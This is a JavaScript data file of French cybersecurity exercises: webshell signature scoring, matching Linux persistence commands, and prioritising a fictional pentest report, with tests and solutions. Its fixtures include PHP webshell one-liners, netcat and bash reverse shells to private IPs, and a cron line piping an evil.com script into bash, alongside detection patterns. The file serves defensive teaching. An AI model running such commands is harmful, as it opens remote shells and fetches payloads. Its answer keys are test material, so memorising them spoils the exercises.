'use strict';

module.exports = [
  {
    "id": "hk3-c6-e1",
    "chapter": 6,
    "title": "Recherche illustrative de signatures textuelles",
    "level": "n1",
    "language": "analyse",
    "goal": "Relever des familles de chaînes sans certifier la nature ou le risque d’un script.",
    "brief": "<p>Ce modèle recherche uniquement des chaînes littérales et additionne une fois chaque famille présente : commandes (<code>system</code>, <code>passthru</code>, <code>shell_exec</code>, <code>popen</code>) +40 ; évaluation (<code>eval</code>, <code>assert</code>) +30 ; transformations (<code>base64_decode</code>, <code>gzinflate</code>, <code>str_rot13</code>) +20 ; entrées (<code>$_GET</code>, <code>$_POST</code>, <code>$_REQUEST</code>) +20. Le score et les seuils sont fictifs : une correspondance n’établit pas une malveillance et l’absence d’indice ne prouve pas l’innocuité. Une analyse complémentaire est nécessaire.</p><p>Pour <code>SCAN_SCRIPT code=&lt;texte&gt;</code>, afficher <code>WEBSHELL_SCAN: score=&lt;n&gt; status=&lt;INDICES_FORTS|INDICES|AUCUN_INDICE&gt; risk=NON_EVALUE</code> : INDICES_FORTS à partir de 60, INDICES de 20 à 59, AUCUN_INDICE en dessous de 20.</p>",
    "starter": "# Grille d'analyse (hk3-c6-e1) — Recherche illustrative de signatures textuelles\n# Complétez la réponse attendue sous chaque cas ci-dessous :\n\n[Cas 1 — Trois familles textuelles]\n# Données : SCAN_SCRIPT code=<?php eval(base64_decode($_POST[\"payload\"])); ?>\nA_COMPLETER\n\n[Cas 2 — Une seule famille textuelle]\n# Données : SCAN_SCRIPT code=<?php $logo = base64_decode(\"iVBORw0KGgoAAAANSUhEUg==\"); ?>\nA_COMPLETER\n\n[Cas 3 — Aucune des chaînes recherchées]\n# Données : SCAN_SCRIPT code=<?php echo \"<h1>Bienvenue sur le portail</h1>\"; ?>\nA_COMPLETER\n",
    "hints": [
      "Compter chaque famille au maximum une fois.",
      "Le résultat ne classe pas le script comme bénin ou malveillant.",
      "Additionnez les points des signatures de fonctions sensibles détectées sans jamais conclure automatiquement à la malveillance réelle du fichier."
    ],
    "examples": [
      {
        "stdin": "SCAN_SCRIPT code=<?php if(isset($_REQUEST[\"cmd\"])){ system($_REQUEST[\"cmd\"]); } ?>",
        "expected": "WEBSHELL_SCAN: score=60 status=INDICES_FORTS risk=NON_EVALUE",
        "note": "Deux familles sont présentes dans le texte ; le score ne remplace pas l’analyse."
      }
    ],
    "tests": [
      {
        "label": "Trois familles textuelles",
        "stdin": "cas:1",
        "expected": "WEBSHELL_SCAN: score=70 status=INDICES_FORTS risk=NON_EVALUE"
      },
      {
        "label": "Une seule famille textuelle",
        "stdin": "cas:2",
        "expected": "WEBSHELL_SCAN: score=20 status=INDICES risk=NON_EVALUE"
      },
      {
        "label": "Aucune des chaînes recherchées",
        "stdin": "cas:3",
        "expected": "WEBSHELL_SCAN: score=0 status=AUCUN_INDICE risk=NON_EVALUE"
      }
    ],
    "solution": "[Exemple]\nWEBSHELL_SCAN: score=60 status=INDICES_FORTS risk=NON_EVALUE\n\n[Cas 1 — Trois familles textuelles]\nWEBSHELL_SCAN: score=70 status=INDICES_FORTS risk=NON_EVALUE\n\n[Cas 2 — Une seule famille textuelle]\nWEBSHELL_SCAN: score=20 status=INDICES risk=NON_EVALUE\n\n[Cas 3 — Aucune des chaînes recherchées]\nWEBSHELL_SCAN: score=0 status=AUCUN_INDICE risk=NON_EVALUE\n",
    "takeaway": "À retenir : Relever des familles de chaînes sans certifier la nature ou le risque d’un script.\nRepère : Deux familles sont présentes dans le texte ; le score ne remplace pas l’analyse."
  },
  {
    "id": "hk3-c6-e2",
    "chapter": 6,
    "title": "Recherche de motifs de persistance Linux",
    "level": "n2",
    "language": "analyse",
    "goal": "Repérer des motifs textuels associés à des techniques de persistance, sans conclure sur leur intention ou leur risque.",
    "brief": "<p>Une tâche planifiée ou un script de démarrage peut être utilisé pour maintenir un accès. Cette grille recherche uniquement quatre motifs textuels dans une commande ; elle ne lance aucune commande.<br><br>\nMotifs recherchés, par ordre de priorité :<br>\n1. <code>BASH_REVERSE_SHELL</code> : contient <code>/dev/tcp/</code> ou <code>bash -i</code>.<br>\n2. <code>NETCAT_REVERSE_SHELL</code> : contient <code>nc -e</code>, <code>ncat -e</code> ou <code>nc.traditional</code>.<br>\n3. <code>DOWNLOAD_EXECUTE</code> : contient <code>curl</code> ou <code>wget</code> suivi de <code>| sh</code> ou <code>| bash</code>.<br>\n4. <code>PYTHON_SOCKET_SHELL</code> : contient <code>python -c</code> et <code>socket</code>.<br><br>\nIndiquez le premier motif trouvé, ou <code>signature=AUCUNE_CORRESPONDANCE</code> si aucun ne correspond. Une correspondance ne prouve ni l'intention malveillante ni le niveau de risque ; son absence ne prouve pas non plus l'innocuité. Dans les deux cas, renseignez <code>malicious=NON_EVALUE</code> et <code>risk=NON_EVALUE</code> : une analyse complémentaire est nécessaire.<br><br>\nDonnées du cas : <code>PERSIST_AUDIT type=&lt;CRON|SERVICE|SCRIPT&gt; command=&lt;commande&gt;</code>.<br>\nRésultat d’analyse attendu : <code>PERSIST_RESULT: type=&lt;type&gt; malicious=NON_EVALUE signature=&lt;sig&gt; risk=NON_EVALUE</code>.</p>",
    "starter": "# Grille d'analyse (hk3-c6-e2) — Recherche de motifs de persistance Linux\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Reverse shell netcat avec redirection de binaire shell]\n# Données : PERSIST_AUDIT type=SERVICE command=ExecStart=/bin/nc -e /bin/sh 192.168.1.100 9001\nA_COMPLETER\n\n[Cas 2 — Persistance par téléchargement et exécution de script distant]\n# Données : PERSIST_AUDIT type=CRON command=@reboot curl -s http://evil.com/implant.sh | bash\nA_COMPLETER\n\n[Cas 3 — Tâche cron de sauvegarde et synchronisation]\n# Données : PERSIST_AUDIT type=CRON command=0 2 * * * /usr/bin/rsync -avz /data /backup\nA_COMPLETER\n",
    "hints": [
      "Repérez le type après type= et la commande après command=.",
      "Testez les motifs BASH_REVERSE_SHELL, NETCAT_REVERSE_SHELL, DOWNLOAD_EXECUTE, PYTHON_SOCKET_SHELL.",
      "Formatez la sortie PERSIST_RESULT."
    ],
    "examples": [
      {
        "stdin": "PERSIST_AUDIT type=CRON command=* * * * * /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "expected": "PERSIST_RESULT: type=CRON malicious=NON_EVALUE signature=BASH_REVERSE_SHELL risk=NON_EVALUE",
        "note": "La commande contient les motifs textuels de la famille BASH_REVERSE_SHELL."
      }
    ],
    "tests": [
      {
        "label": "Reverse shell netcat avec redirection de binaire shell",
        "stdin": "cas:1",
        "expected": "PERSIST_RESULT: type=SERVICE malicious=NON_EVALUE signature=NETCAT_REVERSE_SHELL risk=NON_EVALUE"
      },
      {
        "label": "Persistance par téléchargement et exécution de script distant",
        "stdin": "cas:2",
        "expected": "PERSIST_RESULT: type=CRON malicious=NON_EVALUE signature=DOWNLOAD_EXECUTE risk=NON_EVALUE"
      },
      {
        "label": "Tâche cron de sauvegarde et synchronisation",
        "stdin": "cas:3",
        "expected": "PERSIST_RESULT: type=CRON malicious=NON_EVALUE signature=AUCUNE_CORRESPONDANCE risk=NON_EVALUE"
      }
    ],
    "solution": "[Exemple]\nPERSIST_RESULT: type=CRON malicious=NON_EVALUE signature=BASH_REVERSE_SHELL risk=NON_EVALUE\n\n[Cas 1 — Reverse shell netcat avec redirection de binaire shell]\nPERSIST_RESULT: type=SERVICE malicious=NON_EVALUE signature=NETCAT_REVERSE_SHELL risk=NON_EVALUE\n\n[Cas 2 — Persistance par téléchargement et exécution de script distant]\nPERSIST_RESULT: type=CRON malicious=NON_EVALUE signature=DOWNLOAD_EXECUTE risk=NON_EVALUE\n\n[Cas 3 — Tâche cron de sauvegarde et synchronisation]\nPERSIST_RESULT: type=CRON malicious=NON_EVALUE signature=AUCUNE_CORRESPONDANCE risk=NON_EVALUE",
    "takeaway": "À retenir : Repérer des motifs textuels associés à des techniques de persistance, sans conclure sur leur intention ou leur risque.\nRepère : La commande contient les motifs textuels de la famille BASH_REVERSE_SHELL."
  },
  {
    "id": "hk3-c6-e3",
    "chapter": 6,
    "level": "n3",
    "language": "analyse",
    "title": "La matrice des risques du rapport de l'hôpital Ventalis",
    "exampleTitle": "Exemple résolu — le rapport de la bibliothèque de Sanzel",
    "goal": "Exploiter la table des vulnérabilités d'un rapport de pentest pour prioriser la remédiation et rédiger la synthèse.",
    "brief": "<p><strong>Énoncé.</strong> Le test d'intrusion de l'hôpital privé Ventalis touche à sa fin : l'auditeur consigne dans son rapport les cinq vulnérabilités retenues et prépare la restitution :</p><table><tr><th>Vulnérabilité</th><th>Score CVSS</th><th>Sévérité</th></tr><tr><th>Injection SQL sur le portail patient</th><td>9,8</td><td>Critique</td></tr><tr><th>IDOR sur les factures</th><td>8,6</td><td>Élevée</td></tr><tr><th>XSS stocké dans la messagerie interne</th><td>6,1</td><td>Moyenne</td></tr><tr><th>Absence d'en-tête HSTS</th><td>5,9</td><td>Moyenne</td></tr><tr><th>Divulgation de la version du serveur</th><td>3,1</td><td>Faible</td></tr></table><ol><li>Combien de vulnérabilités le rapport recense-t-il ?</li><li>Combien sont de sévérité moyenne ?</li><li>Quel est le score CVSS de la vulnérabilité à traiter en priorité absolue ?</li><li>Quel est le score de la deuxième vulnérabilité la plus grave ?</li><li>Quelle section du rapport, destinée à la direction, résume les risques sans jargon technique ?</li><li>Quelle vulnérabilité occupe la deuxième ligne du plan de remédiation : l'IDOR, le XSS, l'absence de HSTS ou la divulgation de version ?</li></ol>",
    "starter": "# Exercice — La matrice des risques du rapport de l'hôpital Ventalis\n# Lisez l'énoncé complet ci-dessus, puis répondez à chaque question dans son bloc.\n# Questions 1 et 2 : un nombre. Questions 3 et 4 : un score. Questions 5 et 6 : un terme.\n\n[Question 1 — Vulnérabilités recensées]\nA_COMPLETER\n\n[Question 2 — Vulnérabilités de sévérité moyenne]\nA_COMPLETER\n\n[Question 3 — Score de la priorité absolue]\nA_COMPLETER\n\n[Question 4 — Score de la deuxième vulnérabilité la plus grave]\nA_COMPLETER\n\n[Question 5 — Section du rapport destinée à la direction]\nA_COMPLETER\n\n[Question 6 — Deuxième vulnérabilité du plan de remédiation]\nA_COMPLETER\n",
    "hints": [
      "Parcourez la colonne Sévérité : les moyennes se comptent ligne par ligne ; les scores se rangent par ordre décroissant pour la priorisation.",
      "La priorité absolue va au score le plus élevé ; la deuxième ligne suit immédiatement ce score dans le classement.",
      "Le rapport destiné à un public non technique porte un nom normalisé : la synthèse (ou résumé) exécutive, placée en tête du document."
    ],
    "examples": [
      {
        "stdin": "Le rapport du pentest de la bibliothèque de Sanzel retient :\nRCE sur le module d'import (9,1 — critique) ; injection SQL (8,8 — élevée) ;\nabsence de double authentification (7,5 — élevée) ; CSRF sur le formulaire d'inscription (4,3 — moyenne) ;\nlisting de répertoire (3,7 — faible).\n\n1) 5 vulnérabilités. 2) 1 seule de sévérité moyenne (le CSRF). 3) Priorité absolue : score 9,1.\n4) Deuxième score : 8,8. 5) Section pour la direction : la synthèse exécutive. 6) Deuxième du plan : l'injection SQL.",
        "expected": "5 vulnérabilités — 1 moyenne — 9,1 — 8,8 — synthèse exécutive — l'injection SQL",
        "note": "Le plan de remédiation suit l'ordre des scores décroissants : 9,1 puis 8,8 puis 7,5, les sévérités ne servent qu'à communiquer."
      }
    ],
    "tests": [
      {
        "label": "Question 1 — Vulnérabilités recensées",
        "stdin": "q:1",
        "expected": "5||cinq"
      },
      {
        "label": "Question 2 — Sévérité moyenne",
        "stdin": "q:2",
        "expected": "2||deux"
      },
      {
        "label": "Question 3 — Score de la priorité absolue",
        "stdin": "q:3",
        "expected": "9,8||9.8"
      },
      {
        "label": "Question 4 — Deuxième score le plus grave",
        "stdin": "q:4",
        "expected": "8,6||8.6"
      },
      {
        "label": "Question 5 — Section pour la direction",
        "stdin": "q:5",
        "expected": "la synthèse exécutive||synthèse exécutive||le résumé exécutif||résumé exécutif||executive summary"
      },
      {
        "label": "Question 6 — Deuxième du plan de remédiation",
        "stdin": "q:6",
        "expected": "l'idor||idor||l'idor sur les factures"
      }
    ],
    "solution": "[Question 1 — Vulnérabilités recensées]\n5\n\n[Question 2 — Vulnérabilités de sévérité moyenne]\n2\n\n[Question 3 — Score de la priorité absolue]\n9,8\n\n[Question 4 — Score de la deuxième vulnérabilité la plus grave]\n8,6\n\n[Question 5 — Section du rapport destinée à la direction]\nla synthèse exécutive\n\n[Question 6 — Deuxième vulnérabilité du plan de remédiation]\nl'idor",
    "takeaway": "1) Le rapport recense 5 vulnérabilités.\n2) Deux sont de sévérité moyenne : le XSS stocké (6,1) et l'absence d'HSTS (5,9).\n3) La priorité absolue est l'injection SQL sur le portail patient, score 9,8.\n4) La deuxième vulnérabilité la plus grave est l'IDOR sur les factures, score 8,6.\n5) La section destinée à la direction est la synthèse exécutive : risques, impacts et priorités, sans jargon technique.\n6) La deuxième ligne du plan de remédiation revient à l'IDOR, immédiatement derrière l'injection SQL dans l'ordre des scores décroissants.\nContrôle : 1 critique (9,8) + 1 élevée (8,6) + 2 moyennes (6,1 et 5,9) + 1 faible (3,1) = 5 vulnérabilités, et le classement 9,8 &gt; 8,6 &gt; 6,1 &gt; 5,9 &gt; 3,1 fixe l'ordre exact du plan de remédiation."
  }
];
